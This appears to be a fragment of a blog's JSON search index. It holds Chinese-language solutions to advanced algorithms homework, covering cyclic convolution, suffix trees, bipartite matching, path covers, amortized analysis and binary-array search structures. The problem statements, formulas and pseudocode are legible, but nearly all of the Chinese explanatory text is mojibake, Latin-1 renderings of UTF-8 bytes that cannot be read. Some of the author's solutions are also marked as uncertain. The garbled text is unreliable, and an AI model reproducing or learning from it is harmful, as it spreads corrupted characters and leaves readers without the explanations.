differences of corresponding elements in the overlapped parts of $A$ and $B$. Note that $B$ must completely reside on $A$. é€™é¡ŒçœŸçš„å¤ªæœ‰è¶£äº†ï¼Œé€™æ˜¯zojçš„é¡Œç›®ï¼Œä»–æœ¬ä¾†å°±å‘Šè¨´ä½ è¦ç”¨cyclic convolutionåšåŠ é€Ÿï¼Œä½†æ˜¯morrisåˆåœ¨å…¶ä»–å…©é …ä¸Šé¢åšäº†æ‰‹è…³ï¼Œè®“ä»–æ›´å¿«ã€‚morris é€™é¡Œå‡è¨­æˆ‘å€‘å…©å¼µåœ–ç‰‡çš„å¤§å°åˆ†åˆ¥æ˜¯$n\\times m,p\\times q$ï¼Œbrute forceçš„è§£æ³•è¤‡é›œåº¦æ˜¯$O(n\\times m\\times p\\times q)$ image A:$$ \\begin{bmatrix} a_1 &amp; a_2 &amp; a_3 \\\\ a_4 &amp; a_5 &amp; a_6 \\\\ a_7 &amp; a_8 &amp; a_9 \\end{bmatrix}$$ image B:$$ \\begin{bmatrix} b_1 &amp; b_2 \\\\ b_3 &amp; b_4 \\\\ \\end{bmatrix}$$ è‹¥å…ˆæŠŠå…©å¼µåœ–ç‰‡çš„ç¬¬ä¸€å€‹å…ƒç´ å°é½Šï¼Œç®—å¼æ‡‰è©²ç‚ºå„ç›¸æ‡‰å…ƒç´ çš„å¹³æ–¹å·®çš„ç¸½å’Œï¼Œ$(x-y)^2&#x3D;x^2-2xy+y^2$ï¼Œå…¶ä¸­æ¯å€‹å…ƒç´ çš„$xy$é …å’Œï¼Œå¯ä»¥ä½¿ç”¨Cyclic Convolution(è¬›ç¾©7-32)ç›´æ¥æ±‚å‡ºï¼Œè¤‡é›œåº¦ç‚º$O(nmlog(nm))$ï¼Œä¸‹é¢æœƒåšèªªæ˜ã€‚ å¦‚ï¼š$b_1$å°é½Š$a_5$ï¼Œçµæœæ‡‰ç‚º: $(b_1-a_5)^2 + (b_2-a_6)^2 + (b_3-a_8)^2 + (b_4-a_9)^2 \\\\ &#x3D; \\sum_{i&#x3D;1â€¦4}(b_i)^2 + {(a_5)^2 + (a_6)^2 + (a_8)^2 + (a_9)^2} - 2(b_1a_5 + b_2a_6 + b_3a_8 + b_4a_9)$ ä¸Šå¼çš„ç¬¬äºŒé …ï¼šæˆ‘å€‘å¯ä»¥é‚Šè¼¸å…¥é‚Šåšå‡ºå¦å¤–ä¸€å€‹é™£åˆ— Aâ€™ä¾†åŠ å¿«è¨ˆç®—: $O(nm)$ $$ \\begin{bmatrix} (a_1)^2 &amp; (a_1)^2+(a_2)^2 &amp; (a_1)^2+(a_2)^2+(a_3)^2 \\\\ (a_1)^2+(a_4)^2 &amp; (a_1)^2+(a_2)^2+(a_4)^2+(a_5)^2 &amp; ç•¥ \\\\ (a_1)^2+(a_4)^2+(a_7)^2 &amp; ç•¥ &amp; ç•¥ \\end{bmatrix}$$ ä¸Šå¼çš„ç¬¬ä¸€é …ï¼šImage Bå› ç‚ºæ˜¯æ¯”è¼ƒå°å¼µçš„åœ–ç‰‡ï¼Œæ‰€ä»¥æ¯å€‹å…ƒç´ çš„å¹³æ–¹ä¸€å®šæœƒç”¨åˆ°ï¼Œå…¨éƒ¨åŠ èµ·ä¾†æ”¾é€²ä¸€å€‹è®Šæ•¸å°±å¥½äº† $O(pq)$ ä¸Šå¼çš„ç¬¬ä¸‰é …ï¼šæŠŠå…©å€‹åœ–ç‰‡çš„çŸ©é™£æ‹‰æˆsequenceï¼Œç„¶å¾Œåœ¨sequenceå¾Œé¢ç”¨0 paddingåˆ°$ 2^{\\lceil log_2n\\rceil} $çš„é•·åº¦ï¼Œå°±æœƒè®Šæˆ$&lt; a_1,a_2,\\dots ,a_N&gt;,&lt; b_1,b_2,\\dots, b_N&gt;$ï¼Œå…©å€‹sequenceåšCyclic Convolutionæœƒå¾—åˆ°ä¸€å€‹é•·åº¦ç‚ºï¼®çš„sequence $r$ï¼Œä¾‹ï¼š$&lt; 1,2,3,4 &gt;,&lt; 1,2,3,4 &gt;$é€™å…©å€‹sequenceæœƒç”¢å‡º$&lt; 30,24,22,24 &gt;$ $O(NlogN)$ $$ 30 &#x3D; (1*1 + 2*2 + 3*3 + 4*4) \\\\ 24 &#x3D; (1*4 + 2*1 + 3*2 + 4*3) \\\\ 22 &#x3D; (1*3 + 2*4 + 3*1 + 4*2) \\\\ 24 &#x3D; (1*2 + 2*3 + 3*4 + 4*1) \\\\$$ é¡Œå…« Given a set $S$ of $k$ strings, we want to find every string in $S$ that is a substring of some other string in $S$. Assume that the total length of all the strings in $S$ is $n$, give an $O(n)$ time algorithm to solve this problem. æŠŠsetä¸­å…¨éƒ¨çš„å­—ä¸²æ‹¿ä¾†åšGeneralized Suffix Treeï¼Œä¹‹å¾Œæ‹¿æ¯å€‹å­—ä¸²åœ¨GSTä¸­åšæœå°‹ï¼Œåªè¦èƒ½æ‰¾åˆ°å…©æ¬¡ï¼Œå°±è¡¨ç¤ºé™¤äº†è‡ªå·±ä¹‹å¤–ï¼Œé‚„æ˜¯å…¶ä»–å­—ä¸²çš„å­å­—ä¸²ã€‚ è¤‡é›œåº¦åˆ†æï¼šå»ºæ§‹GST : $O(n)$ (næ˜¯å­—ä¸²ç¸½é•·åº¦)æœå°‹æ™‚é–“ : $\\sum_{i&#x3D;1}^{N}O(m_i+n)&#x3D;O(n)$ (Nç‚ºå­—ä¸²æ•¸ï¼Œmç‚ºé—œéµå­—çš„é•·åº¦)ç¸½æ™‚é–“è¤‡é›œåº¦ : $O(n)$suffix treeåŠç·šæ€§æ™‚é–“é€ æ¨¹GST é¡Œä¹ Give a linear-time algorithm that takes in a string and finds the longest maximal pair of equal substrings in which the two copies do not overlap. That is, if the two copies begin at positions $p1 &lt; p2$ and are of length $nâ€™$, then $p1+ nâ€™ &lt; p2$. å°æ¯å€‹ç¯€é»$N_i$ï¼Œæ‰¾å‡ºå…¶å­æ¨¹ä¸­çš„çš„æœ€å¤§åŠæœ€å°ç´¢å¼•å€¼ä¹‹å·®$\\delta$ï¼Œå‰‡å¯ä»¥rootåˆ°$N_i$çš„è·¯å¾‘ä¸Šå¯ä»¥å¾—åˆ°ä¸€äº›å­å­—ä¸²ï¼Œè€Œé€™å€‹å­å­—ä¸²çš„é•·åº¦å¿…é ˆå°æ–¼ç­‰æ–¼$\\delta$ï¼Œé€™äº›å°±æ˜¯å…±åŒå­å­—ä¸²ã€‚ åƒè€ƒï¼šmorrisdpè§£ï¼Œè¤‡é›œåº¦å¤ªé«˜ä¸è€ƒæ…®overlapçš„è§£æ³• é¡Œå Show how to count the number of distinct substrings of a string $T$ in time $O(n)$, where the length of $T$ is $n$. Also show how to enumerate one copy of each distinct substring in time proportional to the length of all those strings. å¾Œç¶´æ¨¹çš„æ¯å€‹æ¨¹æéƒ½æ˜¯ä¸€å€‹å¾Œç¶´ï¼Œåœ¨é€™å¾Œç¶´ä¸Šé¢æˆ‘å€‘åˆ—èˆ‰ä»–çš„å‰ç¶´å°±å¯ä»¥å¾—åˆ°ä»»æ„å­å­—ä¸²ã€‚ Example : xabxacçš„å¾Œç¶´æ¨¹ |---xa---[]--bxac--[] | | | |---c----[] |[root]--a--[]--bxac--[] | | | |---c----[] | |--c--[] | |---bxac---[] æ‹¿ç¬¬ä¸€å€‹æ¨¹æä¾†èªªï¼Œæˆ‘å€‘å¯ä»¥æ‰¾åˆ°ä»¥ä¸‹å­å­—ä¸²ï¼šx,xa,xab,xabx,xabxa,xabxac,xacï¼Œä¸é›£ç™¼ç¾å­å­—ä¸²æ•¸å°±æ˜¯é‚Šä¸Šçš„å­—å…ƒæ•¸ã€‚ è¤‡é›œåº¦åˆ†æï¼šå»ºæ§‹suffix tree : $O(n)$è¨ˆç®—å­—å…ƒæ•¸ï¼š$O(n)$ (suffix treeçš„å¤§å°æ˜¯$\\Theta(n)$)ç¸½æ™‚é–“è¤‡é›œåº¦ï¼š $O(n)$ é¡Œåä¸€ Solve the minimum coloring problem on interval graphs. Interval graph: ç”¨å‰é¢æ´»å‹•è¦åŠƒçš„å•é¡Œä¾†èˆ‰ä¾‹ï¼Œå°±æ˜¯æŠŠæ´»å‹•è½‰ç‚ºgraphè¡¨ç¤ºï¼Œæ¯å€‹æ´»å‹•ç‚ºåœ–ä¸Šçš„é»ï¼Œå¦‚æœå…©æ´»å‹•æ™‚é–“æœ‰é‡ç–Šå°±åœ¨å…©é»é–“åŠ ä¸Šé‚Šã€‚ è‘—è‰²çš„æ„æ€è¡¨ç¤ºæ ¹æ“šé¡è‰²ä½¿ç”¨æŸå€‹è³‡æºï¼Œæ‰€ä»¥é¡è‰²è¶Šå°‘æ‰€ä½”ç”¨çš„è³‡æºè¶Šå°‘ï¼Œé€™ç¨®æ¦‚å¿µï¼Œä¸éé€™ä¸æ˜¯é‡é»ï¼Œå› ç‚ºé€™é¡Œå°±æ˜¯è¦è‘—è‰²æ²’çµ¦æ´»å‹•ã€‚ ä¸ç¢ºå®šå°ä¸å°ï¼Œmorrisè§£æ³•(greedy)ï¼šbfsè‘—è‰²ï¼Œå¡«å…¥ä¸è·Ÿé„°è¿‘é»è¡çªçš„æœ€å°è‰²è™Ÿã€‚ Interval Graph Coloring ProblemInterval graph é¡ŒåäºŒ Design an algorithm for determining $\\alpha (G)$ and $k(G)$ on a bipartite graph $G$. $\\alpha(G)$: æœ€å¤§ç¨ç«‹é›†çš„å¤§å° $k(G)$: æœ€å°åœ˜è¦†è“‹çš„æ•¸é‡ åœ˜ï¼šæ¯å€‹é»éƒ½æ˜¯ç›¸é„°çš„ï¼Œå‰‡å¯ä»¥ç¨±ç‚ºåœ˜ï¼Œå³é€™å€‹åœ˜åˆ‡ä¸‹ä¾†å¯ä»¥çœ‹æˆæ˜¯ä¸€å€‹å®Œå…¨åœ– æœ€å°åœ˜è¦†è“‹ï¼šä½¿ç”¨æœ€å°‘æ•¸é‡çš„åœ˜ï¼Œä¾†åŒ…å«é€™æ•´å¼µåœ–çš„é ‚é» åœ¨ äºŒåˆ†åœ– è£¡é¢ä½ åªèƒ½æ‰¾åˆ°ä¸€äº›ç”±å…©å€‹é»æ§‹æˆçš„åœ˜ã€‚ äºŒåˆ†åœ–ä¸­ï¼š æœ€å¤§ç¨ç«‹é›†çš„å¤§å° &#x3D; é ‚é»ç¸½æ•¸($|V|$) - æœ€å¤§åŒ¹é… æœ€å°åœ˜è¦†è“‹ &#x3D; æœ€å¤§åŒ¹é… + å‰©ä¸‹çš„ç¨ç«‹é» &#x3D; æœ€å¤§åŒ¹é…æ•¸ + (é ‚é»ç¸½æ•¸ - 2 * æœ€å¤§åŒ¹é…) &#x3D; é ‚é»ç¸½æ•¸ - æœ€å¤§åŒ¹é… &#x3D; æœ€å¤§ç¨ç«‹é›†çš„å¤§å° !!! äºŒåˆ†åœ–çš„æœ€å¤§åŒ¹é…ï¼šå¯ç”¨ã€ŒåŒˆç‰™åˆ©æ¼”ç®—æ³•ã€è§£ å„ç¨®å®šç¾©http://blog.csdn.net/Flynn_curry/article/details/52966283äºŒåˆ†åœ–åŒ¹é…äºŒåˆ†åœ–æœ€å¤§ç¨ç«‹é›†clique cover é¡Œåä¸‰ A path cover of a directed graph $G&#x3D;(V, E)$ is a set $P$ of paths such that every vertex in $V$ is included in at least one path in $P$. A minimum path cover of $G$ is a path cover containing the fewest number of paths. Give an algorithm to find a minimum path cover of a directed acyclic graph. å¾DAGå»ºæ§‹äºŒåˆ†åœ–ï¼ŒäºŒåˆ†åœ–è¡¨ç¤ºçš„ï¼Œå°±æ˜¯æ¯å€‹ç¯€é»çš„è·¯å¾‘é—œä¿‚ï¼Œå› ç‚ºä¸å¯äº¤è·¯å¾‘ä¸å¯å…±ç”¨é ‚é»ï¼ŒåŒ¹é…ä¹Ÿä¸å¯å…±ç”¨ï¼Œæ•…å¯ä»¥ç”¨åŒ¹é…ä¾†æ‰¾å‡ºæœ€å°ä¸å¯äº¤è·¯å¾‘è¦†è“‹ã€‚ æœ€å°ä¸å¯äº¤è·¯å¾‘è¦†è“‹ &#x3D; åŸåœ–ç¯€é»æ•¸ - å°æ‡‰çš„äºŒåˆ†åœ–çš„æœ€å¤§åŒ¹é…æ•¸ æœ€å°ç›¸äº¤è·¯å¾‘è¦†è“‹ï¼šæˆ‘å€‘å¯ä»¥å…ˆå¹«åœ–åŠ é‚Šï¼Œå¦‚æœæœ‰è·¯å¾‘1-&gt;2-&gt;3ï¼Œæˆ‘å€‘å°±ç›´æ¥æ–°å¢ä¸€æ¢é‚Š1-&gt;3ï¼Œç„¶å¾Œå†ç”¨æœ€å°ä¸å¯äº¤è·¯å¾‘è¦†è“‹çš„æ–¹æ³•ï¼Œå°±å¯ä»¥æ±‚å¾—ç›¸äº¤è·¯å¾‘è¦†è“‹ã€‚ è§£æ³•å‰ç½®è§£æ³•è§£æ³•","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework5","slug":"Advance-Algorithm-homework5","date":"2018-01-15T03:23:27.000Z","updated":"2020-07-05T12:28:17.000Z","comments":true,"path":"tw/Advance-Algorithm-homework5/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework5/","excerpt":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚","text":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚ é¡Œä¸€ Suppose we wish not only to increment a counter but also to reset it to zero (i.e., make all bits in it 0). Counting the time to examine or modify a bit as $O(1)$, show how to implement a counter as an array of bits so that any sequence of n INCREMENT and RESET operations takes time $O(n)$ on an initially zero counter. (Hint: Keep a pointer to the high-order 1.) èšé›†åˆ†æ n-INCREMENT (aggregate analysis)å¾è¨ˆæ•¸ m åˆ°è¨ˆæ•¸ m+1 ä¸¦ä¸æ˜¯æ¯ä¸€å€‹ä½å…ƒéƒ½æœƒæ”¹è®Šï¼Œè€Œä»¥å‰æˆ‘å€‘é¬†æ•£çš„ä¼°è¨ˆå°±èªªæœ‰å¯èƒ½æ¯ä¸€å€‹ä½å…ƒéƒ½æœƒæ”¹è®Š , ä¾‹å¦‚ 01111111 è®Šæˆ 10000000ã€‚äº‹å¯¦ä¸Š ä»”ç´°è§€å¯Ÿï¼š A[0] ä½å…ƒæ¯é–“éš” $2^0$ æ¬¡ è¨ˆæ•¸æ”¹è®Šä¸€æ¬¡ A[1] ä½å…ƒæ¯é–“éš” $2^1$ æ¬¡ è¨ˆæ•¸æ”¹è®Šä¸€æ¬¡ A[2] ä½å…ƒæ¯é–“éš” $2^2$ æ¬¡ è¨ˆæ•¸æ”¹è®Šä¸€æ¬¡ â€¦ A[k] ä½å…ƒæ¯é–“éš” $2^k$ æ¬¡ è¨ˆæ•¸æ”¹è®Šä¸€æ¬¡ $\\frac{n}{2^0}+\\frac{n}{2^1}+\\frac{n}{2^2}+â€¦+\\frac{n}{2^k}â‰¤2n$å› æ­¤ $T(n)&#x3D;O(2n)&#x3D;O(n)$ RESETç›´æ¥æ•´å€‹A[]å¾é ­åˆ°å°¾æ­¸0 $\\rightarrow O(n)$ CASE STUDY 2 : Incrementing a binary counter é¡ŒäºŒ Show how to implement a queue with two ordinary stacks so that the amortized cost of each Enqueue and Dequeue operation is $O(1)$. åœ¨æ”¤éŠ·å¼åˆ†æä¸‹ï¼ŒinqueueåŠdequeueçš„æ™‚é–“è¤‡é›œåº¦ç‚º$O(1)$ pseudo123456789instack, outstackpush(val) instack.push(val)pop() &#123; if(outstack.empty) while(!instack.empty) outstack.push(instack.pop()) return outstack.pop();&#125; by Accounting Method (è¨˜å¸³æ–¹æ³•) å¯¦éš›ä»£åƒ¹ï¼šPush: total = 1 instack_push: 1Pop : total = 2*instack_size + 1 instack_pop_to_empty: instack_size outstack_push : instack_size outstack_pop : 1å¹³æ”¤ä»£åƒ¹(amortized cost):Push: 4 each element just has at most 4 steps: instack_push : 1 instack_pop : 1 outstack_push: 1 outstack_pop : 1Pop : 0T(n) &lt;= 4n, T(n)/n &lt;= 4 â†’ O(1) é¡Œä¸‰ Consider an ordinary binary min-heap data structure with n elements supporting the instructions INSERT and EXTRACT-MIN in $O(lgn)$ worst-case time. Give a potential function $\\Phi$ such that the amortized cost of INSERT is $O(lgn)$ and the amortized cost of EXTRACT-MIN is $O(1)$ and show that it works. let $\\Phi(H) &#x3D; \\sum\\limits_{i \\in H} w_i$ , where $H$ is the binary min heap, $w_i$ &#x3D; depth of element $i \\in H$.let $c_i &#x3D;$ ç¬¬ $i$ å€‹æ“ä½œçš„å¯¦éš›æˆæœ¬, $n &#x3D; H$çš„å…ƒç´ æ•¸ INSERT: insert element at most depth $logn$ &amp; bubble up a. insert new element: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(logn) + O(logn)$ b. bubble up: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(logn) + 0$ total &#x3D; $O(logn)$ EXTRACT-MIN: remove root node &amp; bubble up a. remove root: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(1) + 0$ b. bubble up: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(logn) + O(-logn)$ total &#x3D; $O(1)$ reference é¡Œå›› Design a data structure to support the following two operations for a dynamic multi-set $S$ of integers, which allows duplicate values:INSERT(S, x) inserts $x$ into $S$.DELETE-LARGER-HALF(S) deletes the largest $\\lceil \\frac{|S|}{2}\\rceil$ elements from $S$.Explain how to implement this data structure so that any sequence of m INSERT and DELETE-LARGER-HALF operations runs in $O(m)$ time. Your implementation should also include a way to output the elements of $S$ in $O(|S|)$ time. è³‡æ–™çµæ§‹ï¼šèª²å ‚ä¸Šèªªæ˜¯dynamic tableï¼ˆå°±æ˜¯c++è£¡é¢çš„vectorçš„æ¦‚å¿µï¼‰ $INSERT(S,x)$ï¼šç›´æ¥æ”¾åœ¨é™£åˆ—æœ€å¾Œé¢ $DELETE-LARGER-HALF(S)$ : ç”¨median-of-mediansç®—æ³•ï¼Œå¯ä»¥åœ¨$O(n)$å…§æ‰¾åˆ°ä¸­ä½æ•¸ï¼Œç„¶å¾Œå†èŠ±$O(n)$çš„æ™‚é–“æŠŠå¤§çš„ä¸€åŠåˆªæ‰ã€‚ ä¸­ä½æ•¸æ¼”ç®—æ³• é¡Œäº” Suppose that in the dynamic table operations, instead of contracting a table by halving its size when its load factor drops below 1&#x2F;4, we contract it by multiplying its size by 2&#x2F;3 when its load factor drops below 1&#x2F;3. What is the amortized cost of a TABLE-DELETE that uses this strategy? åŸºæœ¬ä¸Špotential methodä¸­çš„å¯¦éš›æˆæœ¬è·Ÿaggregate methodä¸­å®šç¾©çš„æ˜¯ä¸€æ¨£çš„æ±è¥¿ï¼Œåªæ˜¯aggregateç”¨è¶¨è¿‘ç„¡é™çš„ç®—æ³•ä¾†ç®—ï¼Œpotentialå‰‡æ˜¯ç”¨æ…‹å‹¢å‡½æ•¸ä¾†è¨ˆç®—ã€‚ potential function ä¸­çš„ $|2*num[T] - size[T]|$ä¾†è‡ªæ–¼accounting methodï¼Œæ ¹æ“šç¬¬ä¸€å€‹referenceï¼Œå‰$\\frac{n}{2}$å€‹å…ƒç´ å­˜æ¬¾ç‚º0ï¼Œå¾Œé¢å­˜æ¬¾ç‚º2ï¼Œåˆªé™¤æ“ä½œäº¦ç›¸åŒï¼Œåªæ˜¯å­˜æ¬¾ç‚º1ã€‚ æ¯”è¼ƒå¥½çš„åŸå§‹ç‰ˆæœ¬(ä½†æ²’æœ‰contract)å®Œæ•´å„ªè³ªç‰ˆæœ¬é€™é¡Œçš„è§£ç­” é¡Œå…­ Study the famous KMP algorithm for the string matching problem and give an amortized analysis of the algorithm. å‡è¨­å­—ä¸²$T$, $P$, $|T| &gt; |P|$åˆ©ç”¨stackä¾†å­˜æ”¾å·²æ¯”å°åˆ°çš„ç›¸åŒå­—å…ƒ push:æ¯”å°ç›¸åŒçš„å­—å…ƒ pop :æŒªå‹• $P$ ä¸€æ ¼ multi-pop(k):æŒªå‹• $P$ kæ ¼ å› æ­¤å°æ‡‰åˆ°stackçš„æ”¤éŠ·åˆ†æï¼š(è¨˜å¸³æ³•) push = 2 pop = 0 multi-pop(k) = 0 total $\\leq O(2|T|)$ å»ºç«‹ $F$ å‡½å¼æ™‚ï¼ŒåŒç† total $\\leq O(2|P|)$ æ‰€ä»¥ç¸½å’Œ &#x3D; $O(|T|+|P|)$ æ¼”ç®—æ³•ç­†è¨˜PTTè«åå…¶å¦™æ‰¾åˆ°çš„Z arrayç®—æ³• é¡Œä¸ƒ Given an array $a[1\\dots n]$, for each position in the array, search among the previous positions for the last position that contains a smaller value. That is, for each position $i$, $1 \\leq i \\leq n$, find the largest possible index pi such that $p_i &lt; i$ and $a[p_i] &lt; a[i]$. For convenience, we attach a dummy element $a[0] &#x3D; -\\infty$. Then, each $p_i$, $1 \\leq i \\leq n$, is well-defined. Design a linear time algorithm to solve this problem. é¡Œç›®çµ¦ä¸€å€‹é™£åˆ—ï¼Œè¦æ±‚å°æ¯ä¸€å€‹å…ƒç´ ï¼šå¾€é™£åˆ—å‰é¢æ‰¾ä¸€å€‹æ¯”ç¾åœ¨é€™å€‹å…ƒç´ é‚„å°çš„å…ƒç´ ï¼Œç„¶å¾Œå…¶indexè¶Šå¤§è¶Šå¥½ï¼Œä¸¦ä¸”é¡Œç›®å®šç¾©array[0]ç‚ºè² ç„¡é™ ä½œæ³•ï¼šå¾å°¾å·´é–‹å§‹æ‹œè¨ªï¼ŒæŠŠä¸çŸ¥é“è§£ç­”çš„å…ƒç´ éƒ½æ¨é€²stackè£¡é¢ï¼Œæœ€å¾Œå°±æœƒçŸ¥é“è§£äº† a[1...n] = è¼¸å…¥çš„é™£åˆ—a[0] = -INFpl[1...n] = [0...0]stack = []for i = n to 1 while !stack.empty() &amp;&amp; a[i] &lt; a[stack.top()] pl[stack.pop()] = i stack.append(i)return pl é¡ä¼¼çš„é¡Œç›® é¡Œå…« Binary search of a sorted array takes logarithmic search time, but the time to insert a new element is linear in the size of the array. We can improve the time for insertion by keeping several sorted arrays. Specifically, suppose that we wish to support SEARCH and INSERT on a set of n elements. Let $k &#x3D; \\lceil lg(n+1)\\rceil$, and let the binary representation of $n$ be $&lt; n_{k-1}, n_{k-2}, \\dots , n_{0}&gt;$. We have k sorted arrays $A_0, A_1, \\dots , A_{k-1}$, where for $i &#x3D; 0, 1, \\dots, k-1$, the length of array $A_i$ is $2^i$. Each array is either full or empty, depending on whether $n_i &#x3D; 1$ or $n_i &#x3D; 0$, respectively. The total number of elements held in all k arrays is therefore exactly n. Although each individual array is sorted, elements in different arrays bear no particular relationship to each other.a) Describe how to perform the SEARCH operation for this data structure. Analyze its worst-case running time.b)Describe how to perform the INSERT operation. Analyze its worst-case and amortized running times.c) Discuss how to implement DELETE. å‡è¨­è¼¸å…¥æœ‰$n$å€‹å…ƒç´ ï¼Œå‰‡æˆ‘å€‘ä»¤$k&#x3D;\\lceil log(n+1)\\rceil$ï¼Œè¡¨ç¤º$n$åŒ–ç‚ºäºŒé€²ä½æ‰€éœ€è¦çš„ä½å…ƒæ•¸ï¼Œä¸¦ä¾æ­¤å®£å‘Šå¤šå€‹é™£åˆ—$A_0,A_1,A_2, \\dots ,A_{k-1}$ï¼Œæ¯å€‹é™£åˆ—çš„é•·åº¦ç‚º$2^i$ï¼Œå°æ‡‰nåœ¨äºŒé€²ä½æ™‚çš„ç¬¬iå€‹ä½å…ƒï¼Œä¾ç…§å…¶å°æ‡‰çš„ä½å…ƒå¦‚æœæ˜¯1å°±è£æ»¿å¦å‰‡ä¸ä½œä½¿ç”¨ï¼Œè€Œä¸”æ¯å€‹é™£åˆ—å…§çš„å…ƒç´ æ˜¯æ’åˆ—éçš„ï¼Œä½†å…©é™£åˆ—é–“çš„å…ƒç´ æ²’æœ‰çµ•å°çš„é—œä¿‚å­˜åœ¨(é€™è£¡ç‚ºæ–¹ä¾¿è¡¨ç¤ºï¼Œé™£åˆ—å…§çš„indexå¾1é–‹å§‹)ã€‚ SEARCH : æ‰¾å‡ºæ‰€æœ‰ä½¿ç”¨ä¸­çš„é™£åˆ—ï¼Œå°å…¶åšäºŒåˆ†æœ è¤‡é›œåº¦ï¼š æœ€å·®æƒ…æ³æˆ‘å€‘éœ€è¦çœ‹éæ¯å€‹é™£åˆ—ï¼Œä¸”æ¯å€‹é™£åˆ—æˆæœ¬ç‚º$O(log(2^i))&#x3D;O(i)$ å› æ­¤è¤‡é›œåº¦ç‚º$\\sum_{i&#x3D;0}^{k}O(i)&#x3D;O(k^2)&#x3D;O(log^2n)$ 12345678910Search(A, n, key) i = 0 while n &gt; 0 do if n is odd then pos = BSearch(A_i, 2^i , key) if pos != 0 then return (i; pos) n = n/2 i = i + 1 return &quot;not found&quot; INSERT : æ’å…¥å…ƒç´ æœƒä½¿nå¢åŠ ï¼Œæ„å‘³è‘—æˆ‘å€‘å¿…é ˆæ¬å‹•é™£åˆ—ï¼Œä»¥ç¬¦åˆå…¶äºŒé€²ä½çš„è®ŠåŒ– æ¯æ¬¡æ’å…¥å…ƒç´ ä½¿$n+1$ï¼Œå‰‡å¾LSBèµ·ï¼Œé€£çºŒçš„1éƒ½å°‡é€²ä½ç‚º0ï¼Œå› æ­¤æˆ‘å€‘è¦å¾LSBèµ·æ‰¾ç¬¬ä¸€å€‹0 å®šç¾© $Merge(A_a,A_b,A_c)$ï¼Œå°‡é™£åˆ—$A_a,A_b$åˆä½µå¾Œæ”¾é€²$A_c$ è¤‡é›œåº¦ (aggregate method): æ¯å€‹$B_i$é™£åˆ—ç”¢ç”Ÿçš„æˆæœ¬ä¾†è‡ªMergeç‚º$O(2^i)$ å‡è¨­æˆ‘å€‘å¾$n&#x3D;1$ä¸€ç›´INSERTå…ƒç´ ç›´åˆ°$n&#x3D;N$ï¼Œé€™ä¸­é–“$B_i$å…±æœƒè¢«ç”¢ç”Ÿ$\\lfloor\\frac{N}{2^i}\\rfloor$æ¬¡ å¾—$\\sum_{i&#x3D;0}^{k-1}\\lfloor\\frac{N}{2^i}\\rfloor O(2^i)\\leq \\sum_{i&#x3D;0}^{k-1}O(2^k)\\leq O(2^kk) &#x3D; O(NlogN)$ å› æ­¤æœ¬æ“ä½œçš„å¹³æ”¤ä»£åƒ¹ç‚º $\\frac{O(NlogN)}{N} &#x3D; O(logN)$ 12345678Insert(A, n, e) i = 0 B_0 = &#123;e&#125; while n is odd do Merge(A_i, B_i, B_i+1) n = n/2 i = i + 1 A_i = B_i DELETE : ç”±æ–¼åˆªé™¤å…ƒç´ å°è‡´næ¸›å°‘ï¼Œå¾LSBèµ·ï¼Œé€£çºŒçš„0éƒ½å°‡å€Ÿä½å¾—1ï¼Œå› æ­¤æˆ‘å€‘è¦å¾LSBèµ·æ‰¾ç¬¬ä¸€å€‹1ï¼Œä¸¦å°‡å…¶ä¸­çš„å…ƒç´ æ‹†åˆ†åˆ°è¼ƒä½ä½çš„é™£åˆ—ç•¶ä¸­ å®šç¾©Replace($A_i$, pos, e)å¯ä»¥å°‡åŸæœ¬$A_i[pos]$å…ƒç´ æ›¿ä»£ç‚º$e$ï¼Œä¸¦ä¸”ä¿è­‰ä½¿é™£åˆ—è™•æ–¼æ’åºéçš„ç‹€æ…‹ é€™è£pseudo codeä¸­çš„$A_i[j:k]$ï¼Œè¡¨ç¤ºå–$A_i$ä¸­ç¬¬jå€‹åˆ°ç¬¬kå€‹å…ƒç´ (åŒ…æ‹¬k) ä½¿ç”¨é™£åˆ—ä¸­æœ€é«˜çš„å€¼$A_k[2^k]$ä¾†é€²è¡Œå–ä»£ï¼Œåœ¨æ‹†åˆ†æ™‚åªå–$A_k[1:2^k-1]$ 123456789101112Delete(A, n, i, pos) k = 0 while n is even do n = n/2 k = k + 1 if i = k then Replace(A_k[1 : 2^k - 1], pos, A_k[2^k]) else Replace(A_i, pos, A_k[2^k]) for i = 0 to k do A_i = A_k[2^i : 2^(i+1)-1] A_i = &#123;&#125; SEARCH: $O(log^2 n)$ INSERT: $O(logn)$ DELETE: é¡Œç›®æ²’è¦æ±‚ reference","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework4","slug":"Advance-Algorithm-homework4","date":"2018-01-15T02:03:40.000Z","updated":"2020-07-05T12:48:13.000Z","comments":true,"path":"tw/Advance-Algorithm-homework4/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework4/","excerpt":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚","text":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚ é¡Œä¸€ For two points $p$ and $q$ in the plane, we say that $p$ dominates $q$ if both $x$ and $y$ coordinates of $p$ are no less than that of $q$ 